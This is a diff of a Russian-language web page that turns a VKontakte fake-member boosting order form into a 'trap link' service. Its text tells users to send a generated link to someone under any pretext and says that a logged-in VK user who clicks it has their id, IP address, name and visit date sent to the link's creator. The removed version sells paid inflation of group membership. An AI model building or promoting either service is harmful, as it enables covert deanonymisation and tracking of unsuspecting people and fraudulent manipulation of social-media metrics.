@@ -26,12 +26,12 @@
     <script src="//vk.com/js/api/openapi.js" type="text/javascript"></script>
 
 </head>
-<body ng-controller="OnlineMemberCtrl">
+<body ng-controller="IndexCtrl">
 <toast></toast>
 <header>
     <div class="container">
         <div class="row">
-            <h1><b>Заказать</b> накрутку вконтакте</h1>
+            <h1><b>Пробив пользователей<br/> Вконтакте</b></h1>
 
             <div class="col-md-3"></div>
             <div class="col-md-6">
@@ -42,84 +42,29 @@
                     <div class="icon_line-chart">
                         <i class="fa fa-line-chart"></i>
                     </div>
-                    <div class="input-group">
-                        <input type="text" class="form-control"
-                               ng-model="groupUrl"
-                               ng-disabled="groupFormActive"
-                               ng-class="(form_post && !groupUrl) ? 'red_border' : ''"
-                               placeholder="Введите ссылку на группу...">
-                        <span class="input-group-btn">
-                            <button class="btn btn-default" type="button"
-                                    ng-disabled="groupFormActive"
-                                    ng-click="startVK()">Проверка
-                            </button>
-                        </span>
-                    </div>
-                    <div class="alert alert-success alert-dismissible" ng-show="groupFormActive">
-                        <button type="button" class="close" ng-click="reset()">
-                            <span aria-hidden="true">&times;</span>
-                        </button>
-                        <div class="media">
-                            <div class="media-left">
-                                <div class="img">
-                                    <a href="https://vk.com/{{ group.screen_name }}" target="_blank">
-                                        <img class="media-object" ng-src="{{ group.photo_50 }}">
-                                    </a>
-                                </div>
-                            </div>
-                            <div class="media-body">
-                                <strong>{{ group.name }}</strong><br/>
-                                Участников: {{ group.members_count }}
-                            </div>
-                        </div>
-                    </div>
-                    <div class="row" style="margin-top: 20px;">
-                        <div class="col-md-12" align="center">
-                            <div class="input-group" style="float:left;margin-right: 10px;">
-                                <select name="country" class="form-control" ng-model="country">
-                                    <option value="Любая">Любая страна</option>
-                                    <option value="Россия">Россия</option>
-                                    <option value="Украина">Украина</option>
-                                    <option value="Беларусь">Беларусь</option>
-                                </select>
-                            </div>
-                            <div class="input-group" style="float:left;margin-right: 10px;">
-                                <select name="sex" class="form-control" ng-model="sex">
-                                    <option value="Любой">Любой пол</option>
-                                    <option value="Мужской">Мужской</option>
-                                    <option value="Женский">Женский</option>
-                                </select>
-                            </div>
-                            <div class="input-group hi" style="text-align: left;">
-                                <input type="text" class="form-control"
-                                       placeholder="Вконтакте">
-                                <span>Не обязательно</span>
-                            </div>
-                        </div>
-                    </div>
                     <div class="row">
                         <div class="col-md-12">
-                            <div class="input-group hi" style="text-align: left;float: left;width: 100px;">
+                            <div class="input-group hi" style="text-align: left;">
                                 <input type="text" class="form-control"
-                                       ng-model="count_members"
-                                       ng-class="(form_post && ((count_members == 0) || !count_members)) ? 'red_border' : ''"
-                                       placeholder="1000">
+                                       ng-model="project_name"
+                                       placeholder="Название проекта...">
                             </div>
-                            <div class="input-group remove">
-                                <i class="fa fa-times"></i>
-                                {{ price.member }}
-                                =
-                            </div>
-                            <div class="input-group price">
-                                {{ price.member * ((count_members) ? count_members : 0) }}
-                                <i class="fa fa-rub"></i>
+                        </div>
+                    </div>
+                    <div class="row" style="margin-top: 10px;">
+                        <div class="col-md-12">
+                            <div class="input-group hi" style="text-align: left;">
+                                <input type="text" class="form-control"
+                                       ng-model="project_redirect_url"
+                                       placeholder="Ссылка для редиректа...">
+                                <span>Пример: https://www.google.ru</span>
                             </div>
                         </div>
                     </div>
                     <div class="row" style="margin-top: 20px;">
                         <div class="col-md-12">
                             <button type="button" ng-click="_form_post()" class="btn btn-default">
-                                Заказать накрутку
+                                Создать проект
                             </button>
                         </div>
                     </div>
@@ -131,25 +76,23 @@
                     <div class="icon_line-chart">
                         <i class="fa fa-line-chart"></i>
                     </div>
-                    Ссылка на группу: {{ groupUrl }}<br>
-                    Количество участников: {{ count_members }}<br><br>
-                    <b>Критерии:</b><br>
-                    Страна: {{ country }}<br>
-                    Пол: {{ sex }}<br>
-                    <br>
-                    Сумма к оплате: {{ price.member * ((count_members) ? count_members : 0) }} рублей.
+                    Название проекта: {{ project_name }}<br>
+                    Ссылка для редиректа: {{ project_redirect_url }}<br><br>
+                    <b>О проекте:</b><br>
+                    Ссылка для отправки: <a href="{{ url_1 }}" target="_blank">{{ url_1 }}</a><br>
+                    Ссылка для просмотра результатов: <a href="{{ url_2 }}" target="_blank">{{ url_2 }}</a><br>
                 </div>
                 <div class="right_il">
-                    <h2>Правила для групп</h2>
+                    <h2>О сервисе</h2>
                     <ol>
                         <li>
-                            Необходимо убедиться в том, что страница которую вы заказываете будет доступна всем (если к
-                            примеру группа или публичная страница, то они должны быть открытые)! Иначе заказ выполнен не
-                            будет!
+                            С помощью данного сервиса можно создать персональную ссылку-ловушку для пользователя
+                            социальной сети Вконтакте.
                         </li>
                         <li>
-                            Заказ не будет принят если тематика группы будет связана с запрещенными темами Вконтакте.
-                            Такие как: секс, афёры, спекуляция...
+                            Вы создаете ссылку для "ловушки" людей. Сбрасываете ссылку под любым предлогом обидчику,
+                            если обидчик залогинен Вконтакте и перешел по ссылке, то его данные (id, ip, имя и фамилия,
+                            дата) придут Вам на почту и отобразятся в приложении администратору ссылки.
                         </li>
                     </ol>
                 </div>
@@ -171,7 +114,8 @@
 <script src="library/angular-chart.js-master/dist/angular-chart.min.js"></script>
 <script src="library/ngToast-master/dist/ngToast.min.js"></script>
 <script src="library/angular-loading-bar-master/build/loading-bar.min.js"></script>
+<script src="library/md5/md5.js"></script>
 <script src="js/scripts.js"></script>
-<script src="js/controller/onlineMember.js"></script>
+<script src="js/controller/index.js"></script>
 </body>
 </html>
